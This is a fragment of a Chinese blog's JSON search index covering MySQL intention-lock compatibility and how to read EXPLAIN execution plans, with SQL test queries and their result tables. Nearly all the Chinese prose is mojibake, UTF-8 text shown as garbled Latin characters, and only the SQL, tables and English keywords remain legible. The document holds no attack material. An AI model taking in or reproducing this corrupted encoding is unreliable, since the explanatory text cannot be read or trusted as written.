ç”±äºæ„å‘é”ä»…ä»…è¡¨æ˜æ„å‘ï¼Œå®ƒå…¶å®æ˜¯æ¯”è¾ƒå¼±çš„é”ï¼Œæ„å‘é”ä¹‹é—´å¹¶ä¸ç›¸äº’äº’æ–¥ï¼Œè€Œæ˜¯å¯ä»¥å¹¶è¡Œï¼Œå…¶**å…¼å®¹äº’æ–¥è¡¨**å¦‚ä¸‹ï¼š\n\n  |      | IS   | IX   |\n  | ---- | ---- | ---- |\n  | IS   | å…¼å®¹ | å…¼å®¹ |\n  | IX   | å…¼å®¹ | å…¼å®¹ |\n\n  \n\n+ æ—¢ç„¶æ„å‘é”ä¹‹é—´éƒ½ç›¸äº’å…¼å®¹ï¼Œé‚£å…¶æ„ä¹‰åœ¨å“ªé‡Œå‘¢ï¼Ÿå®ƒä¼šä¸å…±äº«é”/æ’å®ƒé”äº’æ–¥ï¼Œå…¶**å…¼å®¹äº’æ–¥è¡¨**å¦‚ä¸‹ï¼š\n\n  |      | S    | X    |\n  | ---- | ---- | ---- |\n  | IS   | å…¼å®¹ | äº’æ–¥ |\n  | IX   | äº’æ–¥ | äº’æ–¥ |\n\n\n\n+ æ„å‘é”æ˜¯æœ‰æ•°æ®å¼•æ“è‡ªå·±ç»´æŠ¤çš„ï¼Œç”¨æˆ·æ— æ³•æ‰‹åŠ¨æ“ä½œæ„å‘é”ï¼Œåœ¨ä¸ºæ•°æ®è¡ŒåŠ å…±äº« / æ’ä»–é”ä¹‹å‰ï¼ŒInooDB ä¼šå…ˆè·å–è¯¥æ•°æ®è¡Œæ‰€åœ¨åœ¨æ•°æ®è¡¨çš„å¯¹åº”æ„å‘é”ã€‚\n\n  æ„å‘é”ç±»ä¼¼ä¸€ä¸ªæ ‡å¿—, èƒ½æé«˜åŠ  è¡¨é” çš„æ•ˆç‡\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [MySQLäº‹åŠ¡å’Œé”æœºåˆ¶è¯¦è§£](https://www.bilibili.com/video/BV1x54y1979n?from=search&seid=4833652458207423339)\n+ https://www.wencst.com/archives/1521\n","tags":["mysql"],"categories":["sql"]},{"title":"mysqlç”¨explainæŸ¥çœ‹æ‰§è¡Œè®¡åˆ’","url":"%2Fp%2F8a4c23bd.html","content":"\nmysql ä½¿ç”¨ `explain + sql è¯­å¥` æ¥æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ï¼Œæ‰§è¡Œç»“æœæœ‰ä»¥ä¸‹å­—æ®µï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š\n\n<!-- more -->\n\n\n# 1. å­—æ®µè¯´æ˜\n\n| å­—æ®µ          | æè¿°                                                         |\n| :------------ | :----------------------------------------------------------- |\n| id            | idç›¸åŒï¼Œæ‰§è¡Œé¡ºåºç”±ä¸Šè‡³ä¸‹ï¼›<br/>idä¸åŒï¼Œidçš„åºå·ä¼šé€’å¢ï¼Œidå€¼è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ï¼Œè¶Šå…ˆè¢«æ‰§è¡Œ<br/>idä¸º`null`æ—¶è¡¨ç¤ºä¸€ä¸ªç»“æœé›†ï¼Œä¸éœ€è¦ä½¿ç”¨å®ƒæŸ¥è¯¢ï¼Œå¸¸å‡ºç°åœ¨åŒ…å«`union`ç­‰æŸ¥è¯¢è¯­å¥ä¸­ã€‚ |\n| select_type   | ä¸»è¦æ˜¯ç”¨äºåŒºåˆ«æ™®é€šæŸ¥è¯¢ã€è”åˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ç­‰çš„å¤æ‚æŸ¥è¯¢         |\n| table         | å½“å‰æ‰§è¡Œçš„è¡¨                                                 |\n| type          | è®¿é—®ç±»å‹                                                     |\n| possible_keys | å¯èƒ½ä½¿ç”¨çš„ç´¢å¼•                                               |\n| key           | å®é™…ä½¿ç”¨çš„ç´¢å¼•                                               |\n| key_len       | ä½¿ç”¨çš„ç´¢å¼•çš„é•¿åº¦                                             |\n| ref           | æ˜¾ç¤ºç´¢å¼•çš„å“ªä¸€åˆ—è¢«ä½¿ç”¨äº†                                     |\n| rows          | æŸ¥è¯¢è¿‡ç¨‹ä¸­å¯èƒ½æ‰«æçš„è¡Œæ•°, åŸåˆ™ä¸Š rows è¶Šå°‘è¶Šå¥½.              |\n| Extra         | è§£ææŸ¥è¯¢çš„é¢å¤–ä¿¡æ¯ï¼Œé€šå¸¸ä¼šæ˜¾ç¤ºæ˜¯å¦ä½¿ç”¨äº†ç´¢å¼•ï¼Œæ˜¯å¦éœ€è¦æ’åºï¼Œæ˜¯å¦ä¼šç”¨åˆ°ä¸´æ—¶è¡¨ç­‰ |\n| partitions    | åŒ¹é…çš„åˆ†åŒº                                                   |\n| filtered      | è¿™ä¸ªå­—æ®µè¡¨ç¤ºå­˜å‚¨å¼•æ“è¿”å›çš„æ•°æ®åœ¨serverå±‚è¿‡æ»¤åï¼Œå‰©ä¸‹å¤šå°‘æ»¡è¶³æŸ¥è¯¢çš„è®°å½•æ•°é‡çš„æ¯”ä¾‹ï¼Œæ³¨æ„æ˜¯ç™¾åˆ†æ¯”ï¼Œä¸æ˜¯å…·ä½“è®°å½•æ•°ã€‚ |\n\n### 1.1 select_type\n\n| ç±»å‹               | è§£é‡Š                                                         |\n| ------------------ | ------------------------------------------------------------ |\n| SIMPLE             | ä¸åŒ…å« UNION æŸ¥è¯¢æˆ–å­æŸ¥è¯¢                                    |\n| PRIMARY            | åŒ…å«å­æŸ¥è¯¢æœ€å¤–å±‚æŸ¥è¯¢å°±æ˜¾ç¤ºä¸º `PRIMARY`                       |\n| SUBQUERY           | å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ª SELECT                                      |\n| DEPENDENT SUBQUERY | å­æŸ¥è¯¢ä¸­çš„ç¬¬ä¸€ä¸ª SELECT, å–å†³äºå¤–é¢çš„æŸ¥è¯¢. å³å­æŸ¥è¯¢ä¾èµ–äºå¤–å±‚æŸ¥è¯¢çš„ç»“æœ. |\n| UNION              | UNION çš„ç¬¬äºŒæˆ–éšåçš„æŸ¥è¯¢                                     |\n| DEPENDENT UNION    | UNION ä¸­çš„ç¬¬äºŒä¸ªæˆ–åé¢çš„æŸ¥è¯¢è¯­å¥, å–å†³äºå¤–é¢çš„æŸ¥è¯¢           |\n| UNION RESULT       | UNION çš„ç»“æœ                                                 |\n\n\n\n\n### 1.2 type\n\n`type` å­—æ®µæ¯”è¾ƒé‡è¦, å®ƒæä¾›äº†åˆ¤æ–­æŸ¥è¯¢æ˜¯å¦é«˜æ•ˆçš„é‡è¦ä¾æ®ä¾æ®. é€šè¿‡ `type` å­—æ®µ, æˆ‘ä»¬åˆ¤æ–­æ­¤æ¬¡æŸ¥è¯¢æ˜¯ `å…¨è¡¨æ‰«æ` è¿˜æ˜¯ `ç´¢å¼•æ‰«æ` ç­‰\n\nä»ä¸Šåˆ°ä¸‹æ€§èƒ½ä»ä½åˆ°é«˜æ’åˆ—:\n\n+ all\n\n  è¡¨ç¤ºå…¨è¡¨æ‰«æ, è¿™ä¸ªç±»å‹çš„æŸ¥è¯¢æ˜¯æ€§èƒ½æœ€å·®çš„æŸ¥è¯¢ä¹‹ä¸€. é€šå¸¸æ¥è¯´, æˆ‘ä»¬çš„æŸ¥è¯¢ä¸åº”è¯¥å‡ºç° ALL ç±»å‹çš„æŸ¥è¯¢, å› ä¸ºè¿™æ ·çš„æŸ¥è¯¢åœ¨æ•°æ®é‡å¤§çš„æƒ…å†µä¸‹, å¯¹æ•°æ®åº“çš„æ€§èƒ½æ˜¯å·¨å¤§çš„ç¾éš¾. å¦‚ä¸€ä¸ªæŸ¥è¯¢æ˜¯ ALL ç±»å‹æŸ¥è¯¢, é‚£ä¹ˆä¸€èˆ¬æ¥è¯´å¯ä»¥å¯¹ç›¸åº”çš„å­—æ®µæ·»åŠ ç´¢å¼•æ¥é¿å….\n\n+ index\n\n  è¡¨ç¤ºå…¨ç´¢å¼•æ‰«æ(full index scan), å’Œ ALL ç±»å‹ç±»ä¼¼, åªä¸è¿‡ ALL ç±»å‹æ˜¯å…¨è¡¨æ‰«æ, è€Œ index ç±»å‹åˆ™ä»…ä»…æ‰«ææ‰€æœ‰çš„ç´¢å¼•, è€Œä¸æ‰«ææ•°æ®.\n\n  `index` ç±»å‹é€šå¸¸å‡ºç°åœ¨: æ‰€è¦æŸ¥è¯¢çš„æ•°æ®ç›´æ¥åœ¨ç´¢å¼•æ ‘ä¸­å°±å¯ä»¥è·å–åˆ°, è€Œä¸éœ€è¦æ‰«ææ•°æ®. å½“æ˜¯è¿™ç§æƒ…å†µæ—¶, Extra å­—æ®µ ä¼šæ˜¾ç¤º `Using index`.\n\n  ```sql\n  EXPLAIN SELECT name FROM  user_info \\G\n  ```\n\n+ range\n\n  è¡¨ç¤ºä½¿ç”¨ç´¢å¼•èŒƒå›´æŸ¥è¯¢, é€šè¿‡ç´¢å¼•å­—æ®µèŒƒå›´è·å–è¡¨ä¸­éƒ¨åˆ†æ•°æ®è®°å½•. è¿™ä¸ªç±»å‹é€šå¸¸å‡ºç°åœ¨ =, <>, >, >=, <, <=, IS NULL, <=>, BETWEEN, IN() æ“ä½œä¸­.\n  å½“ `type` æ˜¯ `range` æ—¶, é‚£ä¹ˆ EXPLAIN è¾“å‡ºçš„ `ref` å­—æ®µä¸º NULL, å¹¶ä¸” `key_len` å­—æ®µæ˜¯æ­¤æ¬¡æŸ¥è¯¢ä¸­ä½¿ç”¨åˆ°çš„ç´¢å¼•çš„æœ€é•¿çš„é‚£ä¸ª.\n\n+ index_merge\n\n+ ref\n\n  æ­¤ç±»å‹é€šå¸¸å‡ºç°åœ¨å¤šè¡¨çš„ join æŸ¥è¯¢, é’ˆå¯¹äºéå”¯ä¸€æˆ–éä¸»é”®ç´¢å¼•, æˆ–è€…æ˜¯ä½¿ç”¨äº† `æœ€å·¦å‰ç¼€` è§„åˆ™ç´¢å¼•çš„æŸ¥è¯¢.\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id AND order_info.user_id = 5\\G\n  ```\n\n+ eq_ref\n\n  æ­¤ç±»å‹é€šå¸¸å‡ºç°åœ¨å¤šè¡¨çš„ join æŸ¥è¯¢, è¡¨ç¤ºå¯¹äºå‰è¡¨çš„æ¯ä¸€ä¸ªç»“æœ, éƒ½åªèƒ½åŒ¹é…åˆ°åè¡¨çš„ä¸€è¡Œç»“æœ. å¹¶ä¸”æŸ¥è¯¢çš„æ¯”è¾ƒæ“ä½œé€šå¸¸æ˜¯ `=`, æŸ¥è¯¢æ•ˆç‡è¾ƒé«˜. ä¾‹å¦‚:\n\n  ```sql\n  EXPLAIN SELECT * FROM user_info, order_info WHERE user_info.id = order_info.user_id\\G\n  ```\n\n+ const \n\n  é’ˆå¯¹ä¸»é”®æˆ–å”¯ä¸€ç´¢å¼•çš„ç­‰å€¼æŸ¥è¯¢æ‰«æ, æœ€å¤šåªè¿”å›ä¸€è¡Œæ•°æ®. const æŸ¥è¯¢é€Ÿåº¦éå¸¸å¿«, å› ä¸ºå®ƒä»…ä»…è¯»å–ä¸€æ¬¡å³å¯.\n\n  ä¾‹å¦‚ä¸‹é¢çš„è¿™ä¸ªæŸ¥è¯¢, å®ƒä½¿ç”¨äº†ä¸»é”®ç´¢å¼•, å› æ­¤ `type` å°±æ˜¯ `const` ç±»å‹çš„.\n\n  ```sql\n  explain select * from user_info where id = 2\\G\n  ```\n\n+ system\n\n  è¡¨ä¸­åªæœ‰ä¸€æ¡æ•°æ®. è¿™ä¸ªç±»å‹æ˜¯ç‰¹æ®Šçš„ `const` ç±»å‹.\n\n`ALL` ç±»å‹å› ä¸ºæ˜¯å…¨è¡¨æ‰«æ, å› æ­¤åœ¨ç›¸åŒçš„æŸ¥è¯¢æ¡ä»¶ä¸‹, å®ƒæ˜¯é€Ÿåº¦æœ€æ…¢çš„.\nè€Œ `index` ç±»å‹çš„æŸ¥è¯¢è™½ç„¶ä¸æ˜¯å…¨è¡¨æ‰«æ, ä½†æ˜¯å®ƒæ‰«æäº†æ‰€æœ‰çš„ç´¢å¼•, å› æ­¤æ¯” ALL ç±»å‹çš„ç¨å¿«.\nåé¢çš„å‡ ç§ç±»å‹éƒ½æ˜¯åˆ©ç”¨äº†ç´¢å¼•æ¥æŸ¥è¯¢æ•°æ®, å› æ­¤å¯ä»¥è¿‡æ»¤éƒ¨åˆ†æˆ–å¤§éƒ¨åˆ†æ•°æ®, å› æ­¤æŸ¥è¯¢æ•ˆç‡å°±æ¯”è¾ƒé«˜äº†.\n\n\n\n### 1.3 key_len\n\nè¡¨ç¤ºæŸ¥è¯¢ä¼˜åŒ–å™¨ä½¿ç”¨äº†ç´¢å¼•çš„å­—èŠ‚æ•°. è¿™ä¸ªå­—æ®µå¯ä»¥è¯„ä¼°ç»„åˆç´¢å¼•æ˜¯å¦å®Œå…¨è¢«ä½¿ç”¨, æˆ–åªæœ‰æœ€å·¦éƒ¨åˆ†å­—æ®µè¢«ä½¿ç”¨åˆ°.\nkey_len çš„è®¡ç®—è§„åˆ™å¦‚ä¸‹:\n\n- å­—ç¬¦ä¸²\n  - char(n): n å­—èŠ‚é•¿åº¦\n  - varchar(n): å¦‚æœæ˜¯ utf8 ç¼–ç , åˆ™æ˜¯ 3 *n + 2å­—èŠ‚; å¦‚æœæ˜¯ utf8mb4 ç¼–ç , åˆ™æ˜¯ 4* n + 2 å­—èŠ‚.\n- æ•°å€¼ç±»å‹:\n  - TINYINT: 1å­—èŠ‚\n  - SMALLINT: 2å­—èŠ‚\n  - MEDIUMINT: 3å­—èŠ‚\n  - INT: 4å­—èŠ‚\n  - BIGINT: 8å­—èŠ‚\n- æ—¶é—´ç±»å‹\n  - DATE: 3å­—èŠ‚\n  - TIMESTAMP: 4å­—èŠ‚\n  - DATETIME: 8å­—èŠ‚\n- å­—æ®µå±æ€§: NULL å±æ€§ å ç”¨ä¸€ä¸ªå­—èŠ‚. å¦‚æœä¸€ä¸ªå­—æ®µæ˜¯ NOT NULL çš„, åˆ™æ²¡æœ‰æ­¤å±æ€§.\n\n\n\n### 1.4 Extra\n\n+ Using filesort\n  å½“ Extra ä¸­æœ‰ Using filesort æ—¶, è¡¨ç¤º MySQL éœ€é¢å¤–çš„æ’åºæ“ä½œ, ä¸èƒ½é€šè¿‡ç´¢å¼•é¡ºåºè¾¾åˆ°æ’åºæ•ˆæœ. ä¸€èˆ¬æœ‰ Using filesort, éƒ½å»ºè®®ä¼˜åŒ–å»æ‰, å› ä¸ºè¿™æ ·çš„æŸ¥è¯¢ CPU èµ„æºæ¶ˆè€—å¤§.\n\n+ Using index\n\n  \"è¦†ç›–ç´¢å¼•æ‰«æ\", è¡¨ç¤ºæŸ¥è¯¢åœ¨ç´¢å¼•æ ‘ä¸­å°±å¯æŸ¥æ‰¾æ‰€éœ€æ•°æ®, ä¸ç”¨æ‰«æè¡¨æ•°æ®æ–‡ä»¶, å¾€å¾€è¯´æ˜æ€§èƒ½ä¸é”™\n\n+ Using temporary\n\n  æŸ¥è¯¢æœ‰ä½¿ç”¨ä¸´æ—¶è¡¨, ä¸€èˆ¬å‡ºç°äºæ’åº, åˆ†ç»„å’Œå¤šè¡¨ join çš„æƒ…å†µ, æŸ¥è¯¢æ•ˆç‡ä¸é«˜, å»ºè®®ä¼˜åŒ–.\n\n\n\n# 2. æµ‹è¯•\n\n```bash\ndocker run -d --name mysql-explain -e MYSQL_ROOT_PASSWORD=123456 mysql # åˆ›å»ºä¸€ä¸ªå®¹å™¨\n\ndocker exec -it mysql-explain mysql -u root -p  # è¾“å…¥å¯†ç , è¿›å…¥æ“ä½œ\n```\n\n\n\n### 2.1 æ•°æ®åˆå§‹åŒ–\n\næ–°å»ºæµ‹è¯•è¡¨ï¼Œæ’å…¥ 10w æ•°æ®ï¼š\n\n```sql\n-- åˆ›å»ºåº“\nCREATE DATABASE test1;\nuse test1;\n\n-- åˆ›å»ºè¡¨\nCREATE TABLE `test` (  \n  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,\n  `a` int(11) NOT NULL,\n  `b` int(11) NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n\n-- æ‰¹é‡æ’å…¥ 10w æ•°æ®\nDROP PROCEDURE IF EXISTS batchInsert;\nDELIMITER $  \nCREATE PROCEDURE batchInsert() BEGIN DECLARE i INT DEFAULT 1;  \nSTART TRANSACTION; WHILE i<=100000  \nDO  \nINSERT INTO test (a,b) VALUES (i,i);  \nSET i=i+1; END WHILE;  \nCOMMIT; END $\n\nCALL batchInsert();  \n\n\n-- å¾—åˆ°100000\nselect count(*) from test;\n```\n\n\n\n### 2.2 æ²¡æœ‰ç´¢å¼•\n\nç›®å‰é»˜è®¤åªæœ‰ä¸€ä¸ªä¸»é”®ç´¢å¼•ï¼Œæˆ‘ä»¬åˆ†æä¸‹å…¨è¡¨æŸ¥è¯¢ï¼š\n\n```sql\nexplain select * from test;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra | partitions | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---- | ---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | NULL          | NULL | NULL    | NULL | 100098 | NULL  | NULL       | 100.00   |\n\nå…¶ä¸­ `type` å€¼ä¸º ALLï¼Œè¡¨ç¤ºå…¨è¡¨æ‰«æäº†ï¼Œæˆ‘ä»¬çœ‹åˆ° `rows` è¿™ä¸ªå­—æ®µæ˜¾ç¤ºæœ‰ 100098 æ¡ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä¸€å…±æ‰ 10w æ¡æ•°æ®ï¼Œè¯´æ˜è¿™ä¸ªå­—æ®µåªæ˜¯ mysql çš„ä¸€ä¸ªé¢„ä¼°ï¼Œä¸æ€»æ˜¯å‡†ç¡®çš„ã€‚\n\n\n\n### 2.3 å•ä¸ªå­—æ®µç´¢å¼•\n\næˆ‘ä»¬ç»™å­—æ®µ a æ·»åŠ æ™®é€šç´¢å¼•ã€‚\n\n```sql\nalter table test add index idx_a(a);  \n```\n\n\n\n##### 2.3.1 where ç´¢å¼•\n\n+ èµ° a ç´¢å¼•æ ‘,  è™½1è¡Œä¹Ÿè¦å›è¡¨ã€‚\n\n```sql\nexplain select * from test where a = 10000;     \n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a         | idx_a | 4       | const | 1    | NULL  | 100      |\n\n\n\n+ ä¸èµ°ç´¢å¼•, å› ä¸ºè¿™æ¡è¯­å¥ä¼šä»ç´¢å¼•ä¸­æŸ¥å‡º 9w æ¡æ•°æ®ï¼Œå…¨è¡¨æ‰«æéƒ½æ‰ 10w æ¡æ•°æ®ï¼Œæ‰€ä»¥ mysql å†³ç­–æ˜¯è¿˜ä¸å¦‚ç›´æ¥å…¨è¡¨æ‰«æå¾—äº†ã€‚\n\n```sql\nexplain select * from test where a > 10000;  \n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50.00    |\n\n\n\n+ ä½¿ç”¨äº† a ç´¢å¼•æ ‘, å› ä¸ºæ»¡è¶³ç´¢å¼•åªæœ‰ 10000 æ¡æ•°æ®ï¼Œmysql è®¤ä¸º 10000 æ¡æ•°æ®å°±ç®—å›è¡¨ä¹Ÿè¦æ¯”å…¨è¡¨æ‰«æçš„ä»£ä»·ä½ï¼Œå› è€Œå†³å®šæŸ¥ç´¢å¼•ï¼Œä½†è¿˜æ˜¯éœ€è¦å›è¡¨ã€‚\n\n```sql\nexplain select * from test where a > 90000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ åªselect ç´¢å¼•å­—æ®µ, æ³¨æ„è¿™æ¬¡ Extra çš„å€¼ä¸º `Using where; Using index`ï¼Œè¡¨ç¤ºæŸ¥è¯¢ç”¨åˆ°äº†ç´¢å¼•ï¼Œä¸”è¦æŸ¥è¯¢çš„å­—æ®µåœ¨ç´¢å¼•ä¸­å°±èƒ½æ‹¿åˆ°ï¼Œæ‰€ä»¥ä¸éœ€è¦å›è¡¨ã€‚æ˜¾ç„¶è¿™ç§æ•ˆç‡æ¯”ä¸Šé¢çš„è¦é«˜ï¼Œè¿™ä¹Ÿæ˜¯æ—¥å¸¸å¼€å‘ä¸­ä¸å»ºè®®å†™ select * çš„åŸå› ï¼Œå°½é‡åªæŸ¥è¯¢ä¸šåŠ¡æ‰€éœ€çš„å­—æ®µã€‚\n\n```sql\nexplain select a from test where a > 10000;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100.00   |\n\n\n\n##### 2.3.2 order by ç´¢å¼•\n\norder by æœ€å¥½å’Œ where ç”¨åŒä¸€ä¸ªå­—æ®µ\n\n\n\n+ èµ° a ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using where; Using index | 100.00   |\n\n\n\n+ èµ° a ç´¢å¼•æ ‘, éœ€è¦å›è¡¨\n\n```sql\nexplain select * from test where a > 90000 order by a;\nexplain select b from test where a > 90000 order by a;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :-------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition | 100.00   |\n\n\n\n+ Extraä¸­è¿”å›äº†ä¸€ä¸ª Using filesortï¼Œè¯´æ˜æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆæ’åºï¼Œéœ€è¦ä»å†…å­˜æˆ–ç£ç›˜è¿›è¡Œæ’åºã€‚å°±ç®— b æœ‰ç´¢å¼•, ä¹Ÿæ— æ³•é¿å…, å› ä¸ºä¹Ÿä¼šèµ° a çš„ç´¢å¼•æ ‘ã€‚\n\n```Â sql\nexplain select a from test where a > 90000 order by b;  \n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                                 | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :------------------------------------ | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 10000 | Using index condition; Using filesort | 100.00   |\n\n\n\n### 2.4 å¤šä¸ªå­—æ®µç´¢å¼•å’Œå¤åˆç´¢å¼•\n\n##### 2.4.1 å¤šä¸ªå­—æ®µç´¢å¼•\n\nç›®å‰a, b æœ‰è‡ªå·±çš„å•ä¸ªç´¢å¼•ã€‚\n\n```sql\nalter table test drop index idx_a_b;\nalter table test add index idx_a(a);  \nalter table test add index idx_b(b);\n```\n\n\n+ æ²¡èµ°ç´¢å¼•,æ˜¯å› ä¸ºæ— è®ºå¦‚ä½•éƒ½éœ€è¦å›è¡¨, å¦‚æœæŠŠ10000æ”¹æˆ90000, ä¼šå˜æˆèµ°ç´¢å¼•åŠ å›è¡¨.\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :--- | :------ | :--- | :----- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ALL  | idx_a         | NULL | NULL    | NULL | 100098 | Using where | 50       |\n\n\n\n+ ç›´æ¥èµ°a çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a         | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ èµ° b çš„ç´¢å¼•æ ‘æ›´å¥½,å›è¡¨\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_b | 4       | const | 1    | Using where | 9.99     |\n\n\n\n+ èµ° a çš„ç´¢å¼•æ ‘æ›´å¥½,å›è¡¨\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type | possible_keys | key   | key_len | ref   | rows | Extra       | filtered |\n| :--- | :---------- | :---- | :--- | :------------ | :---- | :------ | :---- | :--- | :---------- | -------- |\n| 1    | SIMPLE      | test  | ref  | idx_a,idx_b   | idx_a | 4       | const | 1    | Using where | 9.99     |\n\n\n\n##### 2.4.2 ä¸€ä¸ªå¤åˆç´¢å¼•\n\n```sql\nalter table test drop index idx_a;\nalter table test drop index idx_b;\nalter table test add index idx_a_b(a,b);  \n```\n\nç›®å‰åªæœ‰ä¸€ä¸ª(a,b)å¤åˆç´¢å¼•\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n\n\n+ ä¸æ»¡è¶³æœ€å·¦åŒ¹é…åŸåˆ™\n\n```sql\nexplain select * from test where b > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows   | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :----- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | index | NULL          | idx_a_b | 8       | NULL | 100098 | Using where; Using index | 33.33    |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨, key_len=4\n\n```sql\nexplain select a,b from test where a > 90000 and b = 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 4       | NULL | 18142 | Using where; Using index | 10       |\n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘, ä¸å›è¡¨, key_len=8\n\n```sql\nexplain select a,b from test where a = 90000 and b > 90000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :--- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b       | idx_a_b | 8       | NULL | 1    | Using where; Using index | 100      |\n\n\n\n##### 2.4.3 æ™®é€šç´¢å¼•å’Œå¤åˆç´¢å¼•åŒæ—¶å­˜åœ¨\n\n```sql\nalter table test add index idx_a(a); \nalter table test add index idx_b(b);  \nalter table test add index idx_a_b(a,b);  \n```\n\nç›®å‰æœ‰2ä¸ªæ™®é€šç´¢å¼•,1ä¸ªå¤åˆç´¢å¼•. \n\n\n\n+ èµ° (a,b) çš„ç´¢å¼•æ ‘æ›´å¥½, ä¸å›è¡¨\n\n```sql\nexplain select * from test where a > 10000;\nexplain select a,b from test where a > 10000;\nexplain select b from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key     | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :------ | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a_b | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n##### \n\n+ èµ° a çš„ç´¢å¼•æ ‘æ›´å¥½, ä¸å›è¡¨\n\n```sql\nexplain select a from test where a > 10000;\n```\n\n| id   | select_type | table | type  | possible_keys | key   | key_len | ref  | rows  | Extra                    | filtered |\n| :--- | :---------- | :---- | :---- | :------------ | :---- | :------ | :--- | :---- | :----------------------- | -------- |\n| 1    | SIMPLE      | test  | range | idx_a_b,idx_a | idx_a | 4       | NULL | 50049 | Using where; Using index | 100      |\n\n##### \n\n+ èµ° b çš„ç´¢å¼•æ ‘,  